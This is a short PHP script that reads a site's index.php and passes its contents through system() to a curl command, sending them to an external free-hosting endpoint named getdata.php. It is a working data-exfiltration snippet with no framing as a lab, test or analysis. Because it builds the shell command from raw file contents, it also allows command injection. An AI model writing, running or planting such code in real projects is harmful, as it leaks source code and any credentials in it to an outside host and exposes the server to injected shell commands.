<?php
	$lolcontent = file_get_contents('index.php');
	$sendcommand = "curl http://jjsam07.000webhostapp.com/getdata.php?c=".$lolcontent;
	system($sendcommand);
?>